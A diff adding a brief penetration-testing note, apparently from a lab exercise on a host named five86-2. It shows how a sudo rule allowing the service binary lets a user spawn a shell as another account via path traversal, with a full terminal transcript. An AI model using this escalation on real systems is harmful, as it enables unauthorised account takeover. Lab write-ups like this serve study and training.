@@ -1,0 +1,22 @@
+after entering sudo -l and seing you can run service as either a user or root you can easily priv esc off it it using the following command:
+
+sudo -u peter service ../../bin/sh
+
+below is an example:
+
+paul@five86-2:/home/stephen$ cd ~
+cd ~
+paul@five86-2:~$ sudo -l
+sudo -l
+Matching Defaults entries for paul on five86-2:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User paul may run the following commands on five86-2:
+    (peter) NOPASSWD: /usr/sbin/service
+paul@five86-2:~$ sudo -u peter service ../../bin/sh
+sudo -u peter service ../../bin/sh
+$ whoami
+whoami
+peter
+
